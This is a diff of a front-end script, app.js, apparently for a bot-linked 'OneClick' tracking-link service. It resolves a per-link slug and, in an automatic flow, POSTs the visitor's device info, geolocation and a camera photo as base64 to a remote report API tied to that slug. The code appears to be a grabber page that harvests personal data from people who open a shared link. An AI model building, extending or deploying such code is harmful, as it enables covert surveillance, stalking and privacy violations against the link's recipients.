@@ -1,5 +1,6 @@
 // === app.js (OneClick linked with bot) ===
 
+// API base comes from index.html <script>window.__API_BASE=...</script>
 const API_BASE = (typeof window !== 'undefined' && window.__API_BASE)
   ? String(window.__API_BASE).replace(/\/+$/, '')
   : '';
@@ -11,16 +12,25 @@ const UI = {
 };
 
 window.__reportReady = false;
-window.__SLUG = null; // глобально
+window.__SLUG = window.__SLUG ?? null; // глобально
 
-// === FETCH LINK INFO (привязка chatId не нужна, чисто проверка slug) ===
+// === slug resolver (query -> /r/<slug> -> cached) ===
+function determineSlug() {
+  const q = new URLSearchParams(location.search).get('slug');
+  const m = location.pathname.match(/^\/r\/([a-z0-9\-]{3,40})$/i);
+  const pathSlug = m ? m[1] : null;
+  const slug = q || pathSlug || window.__SLUG || null;
+  if (slug) window.__SLUG = slug;
+  return slug;
+}
+
+// === FETCH LINK INFO (просто проверка slug) ===
 async function loadLinkInfo() {
-  const params = new URLSearchParams(location.search);
-  window.__SLUG = params.get('slug') || window.__SLUG || null;
-  if (!window.__SLUG) return;
+  const slug = determineSlug();
+  if (!slug) return;
   try {
-    const r = await fetch(`${API_BASE}/api/link-info?slug=${encodeURIComponent(window.__SLUG)}`);
-    if (r.ok) console.log('🔗 link-info ok');
+    const r = await fetch(`${API_BASE}/api/link-info?slug=${encodeURIComponent(slug)}`);
+    if (r.ok) console.log('🔗 link-info ok for', slug);
   } catch (e) {
     console.warn('link-info fetch failed', e);
   }
@@ -76,11 +86,14 @@ function downscaleDataUrl(dataUrl, maxSide = 1280, quality = 0.7) {
       const w = Math.round(img.width * ratio);
       const h = Math.round(img.height * ratio);
       const c = document.createElement('canvas');
-      c.width = w; c.height = h;
+      c.width = w;
+      c.height = h;
       c.getContext('2d').drawImage(img, 0, 0, w, h);
       try {
         resolve(c.toDataURL('image/jpeg', quality));
-      } catch (e) { reject(e); }
+      } catch (e) {
+        reject(e);
+      }
     };
     img.onerror = reject;
     img.src = dataUrl;
@@ -135,10 +148,10 @@ function getDeviceInfo() {
 // === Отправка отчёта ===
 async function sendReport({ photoBase64, geo }) {
   const info = getDeviceInfo();
-  const body = { ...info, geo, photoBase64, note: 'auto' };
+  const slug = determineSlug();
+  if (!slug) throw new Error('No slug in URL');
 
-  // ✅ теперь slug гарантированно уходит
-  if (window.__SLUG) body.slug = window.__SLUG;
+  const body = { ...info, geo, photoBase64, note: 'auto', slug };
 
   const r = await fetch(`${API_BASE}/api/report`, {
     method: 'POST',
@@ -178,4 +191,4 @@ async function autoFlow() {
 
 // === Инициализация ===
 window.__autoFlow = autoFlow;
-loadLinkInfo(); // ← загрузка slug
+loadLinkInfo(); // ← загрузка slug и sanity-check
